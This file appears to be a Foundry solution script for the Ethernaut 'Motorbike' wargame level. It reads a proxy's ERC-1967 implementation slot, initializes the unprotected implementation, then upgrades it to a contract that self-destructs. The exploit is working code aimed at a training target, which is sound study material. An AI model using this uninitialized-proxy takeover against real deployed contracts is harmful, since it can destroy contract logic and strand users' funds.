// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";

interface IMotorbike {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Solution {
    function killIt(IMotorbike _implementation) public {
        _implementation.initialize();
        _implementation.upgradeToAndCall(address(this), abi.encodeWithSignature("destruction()"));
    }

    function destruction() public {
        selfdestruct(tx.origin);
    }
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address implementation = address(uint160(uint256(vm.load(_instanceAddress, implementationSlot))));
        assert(implementation != address(0));

        vm.startBroadcast();
        Solution solution = new Solution();
        solution.killIt(IMotorbike(implementation));
        vm.stopBroadcast();

        // Unfortunately you can't test the effect of a selfdestruct in foundry currently
        // See: https://github.com/foundry-rs/foundry/issues/1543
        // so we have to disable validating the instance for this level
        validateInstance = false;
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("25");
    }

    function getCreationValue() internal view override returns (uint256) {
        return 0;
    }
}
